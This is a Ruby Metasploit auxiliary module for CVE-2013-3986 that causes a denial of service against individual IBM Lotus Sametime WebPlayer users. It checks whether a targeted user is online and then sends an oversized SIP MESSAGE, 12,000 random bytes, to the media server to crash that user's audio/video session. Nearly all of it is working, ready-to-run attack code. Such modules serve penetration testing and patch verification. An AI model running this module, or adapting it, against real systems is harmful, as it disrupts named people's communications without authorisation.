##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

    include Msf::Exploit::Remote::Tcp
    include Msf::Auxiliary::Dos

    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'IBM Lotus Sametime WebPlayer DoS',
            'Description'    => %q{
                This module exploits a known flaw in the IBM Lotus Sametime WebPlayer
                version 8.5.2.1392 (and prior) to cause a denial of service condition
                against specific users. For this module to function the target user
                must be actively logged into the IBM Lotus Sametime server and have
                the Sametime Audio Visual browser plug-in (WebPlayer) loaded as a
                browser extension. The user should have the WebPlayer plug-in active
                (i.e. be in a Sametime Audio/Video meeting for this DoS to work correctly.

                RHOST Target should be the Sametime Media Server address and NOT the
                web interface SIPURI should be in the format
                 <target_email_address>@<sametime_media_server_FQDN> (e.g.
                 targetuser%40targetdomain.com@stmedia.targetdomain.com
            },
            'Author'         =>
            	[
            		'kicks4kittens' # Metasploit module
            	],
            'License'        => MSF_LICENSE,
            'Actions'        =>
                [
                    ['DOS'],
                    ['CHECK']
                ],
            'DefaultAction'  => 'DOS',
            'References'     =>
                [
                    [ 'CVE', '2013-3986' ],
                    [ 'OSVDB', '99552' ],
                    [ 'BID', '63611'],
                    [ 'URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21654041' ],
                    [ 'URL', 'http://xforce.iss.net/xforce/xfdb/84969' ]
                    
                ],
            'DisclosureDate' => 'Nov 07 2013'))

        register_options(
            [
                Opt::RPORT(5060),
                OptString.new('SIPURI', [true, 'The SIP URI of the user to be targeted', \
                                '<target_email_address>@<sametime_media_server_FQDN>']),
                OptBool.new('CHECKUSER', [ true,  'Validate user is logged into Sametime', true]),
                OptInt.new('TIMEOUT', [ true,  'Set specific response timeout', 0])
            ], self.class)

    end

    def setup
        # cleanup SIP target to ensure it's in the correct format to use
        @sipuri = datastore['SIPURI']
        if @sipuri[0,4].downcase == "sip:"
            # remove sip: if present in string
            @sipuri = @sipuri[4,@sipuri.length]
        end
        if @sipuri[0,12].downcase == "webavclient-"
            # remove WebAVClient- if present in string
            @sipuri = @sipuri[12,@sipuri.length]
        end

    end

    def checkuser
        # used to check the user is logged into Sametime and after DoS to check success
        length = Rex::Text.rand_text_numeric(2) # just enough to check response
        msg = create_message(length)

        print_status("Checking if targeted user #{@sipuri} is online")
        res = send_msg(msg)

        # check response for current user status - common return codes
        if not res or res.nil?
            print_error("No response recevied from server")
            return false
        elsif res =~ /430 Flow Failed/i
            print_good("User #{@sipuri} is no longer responding (already DoS'd?)")
            return false
        elsif res =~ /404 Not Found/i
            print_error("User #{@sipuri} is currently offline or not in a Sametime video session")
            return false
        elsif res =~ /200 OK/i
            print_good("User #{@sipuri} is online")
            return true
        else
            print_error("Unknown server response")
            return false
        end

    end

    def run

        # inform user of action currently selected
        print_status("Action: #{action.name} selected")

        if datastore['CHECKUSER'] or action.name == 'CHECK'
            # check the user is online without DOS
            response = checkuser
        else
            print_status("User check disabled, continuing with DoS against #{@sipuri}")
            response = true # no check performed
        end

        unless action.name == 'CHECK' # only proceed if action not set to CHECK
            if response
                # checkuser explicitly disabled or user is online

                print_status("Targeting user: #{@sipuri}")
                print_status("Sending DoS packet to #{rhost}:#{rport}")

                length = 12000 # enough to overflow the end of allocated memory
                msg = create_message(length)
                res = send_msg(msg)

                if not res or res.nil?
                    if datastore['CHECKUSER'] # check user AFTER DoS
                        print_good("User #{@sipuri} is no longer responding")
                    else
                        print_good("No response from server. User is offline or server doesn't respond")
                    end
                elsif res =~ /430 Flow Failed/i
                    print_good("DoS packet successful. Response received (430 Flow Failed)")
                    print_good("User #{@sipuri} is no longer responding")
                elsif res =~ /404 Not Found/i
                    print_error("DoS packet appears successful. Response received (404 Not Found)")
                    print_status("User appears to be currently offline or not in a Sametime video session")
                elsif res =~ /200 OK/i
                    print_error("DoS packet unsuccessful. Response received (200)")
                    print_status("Check user is running an effected version of IBM Lotus Sametime WebPlayer")
                end
            else
                print_error("Check failed, ensure user is online")
            end
        end
    end

    def create_message(length)
        # create SIP MESSAGE of specified length
        vprint_status("Creating SIP MESSAGE packet #{length} bytes long")

        suser = Rex::Text.rand_text_alphanumeric(rand(8)+1)
        shost = Rex::Socket.source_address(datastore['RHOST'])
        src   = "#{shost}:#{datastore['RPORT']}"
        cseq = Rex::Text.rand_text_numeric(3)
        message_text = Rex::Text.rand_text_alphanumeric(length.to_i)
        branch = Rex::Text.rand_text_alphanumeric(7)

        # setup SIP message in the correct format expected by the server
        data =  "MESSAGE sip:WebAVClient-#{@sipuri} SIP/2.0" + "\r\n"
        data << "Via: SIP/2.0/TCP #{src};branch=#{branch}.#{"%.8x" % rand(0x100000000)};rport;alias" + "\r\n"
        data << "Max-Forwards: 80\r\n"
        data << "To: sip:WebAVClient-#{@sipuri}" + "\r\n"
        data << "From: sip:#{suser}@#{src};tag=70c00e8c" + "\r\n"
        data << "Call-ID: #{rand(0x100000000)}@#{shost}" + "\r\n"
        data << "CSeq: #{cseq} MESSAGE" + "\r\n"
        data << "Content-Type: text/plain;charset=utf-8" + "\r\n"
        data << "User-Agent: #{suser}\r\n"
        data << "Content-Length: #{message_text.length}" + "\r\n\r\n"
        data << message_text

        return data
    end

    def timing_get_once(s, length)
        if datastore['TIMEOUT'] and datastore['TIMEOUT'] > 0
            return s.get_once(length, datastore['TIMEOUT'])
        else
            return s.get_once(length)
        end
    end

    def send_msg(msg)

        begin
            s = connect
            # send message and store response
            s.put(msg + "\r\n\r\n") rescue nil
            # read response
            res = timing_get_once(s, 25)
            if res == "\r\n"
                # retry request
                res = timing_get_once(s, 25)
            end
            return res
        rescue ::Rex::ConnectionRefused
            print_status("Unable to connect to #{rhost}:#{rport}")
        rescue ::Errno::ECONNRESET
            print_status("DoS packet successful. #{rhost} not responding.")
        rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
            print_status("Couldn't connect to #{rhost}:#{rport}")
        ensure
            # disconnect socket if still open
            disconnect if s
        end
    end
end
